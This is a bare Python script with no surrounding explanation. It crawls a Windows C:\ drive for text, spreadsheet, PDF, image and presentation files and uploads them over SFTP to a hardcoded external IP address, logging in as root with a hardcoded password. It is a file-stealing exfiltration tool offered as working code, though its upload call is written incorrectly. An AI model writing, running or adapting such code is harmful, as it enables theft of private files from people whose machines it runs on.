from zipfile import ZipFile
import os
import paramiko

def get_all_file_paths(directory):

    # initializing empty file paths list
    file_paths = []

    # crawling through directory and subdirectories
    for root, directories, files in os.walk(directory):
        for filename in files:
            if filename.endswith('.txt') + filename.endswith('.xlsx') + filename.endswith('.pdf') + filename.endswith('.jpg') + filename.endswith('.ppt'):
            # join the two strings in order to form the full filepath.
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)

    # returning all file paths
    return file_paths

def main():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname='172.105.53.52',username='root',password='Root@roxx2',port=22)
    sftp_client = ssh.open_sftp()
    # path to folder which needs to be zipped
    directory = 'C:\\'

    # calling function to get all file paths in the directory
    file_paths = get_all_file_paths(directory)
    # writing each file one by one
    for file in file_paths:
        try:
            sftp_client.put(file_paths,'/root/')
        except PermissionError:
            pass
    sftp_client.close()
    ssh.close()

    

if __name__ == "__main__":
        main()
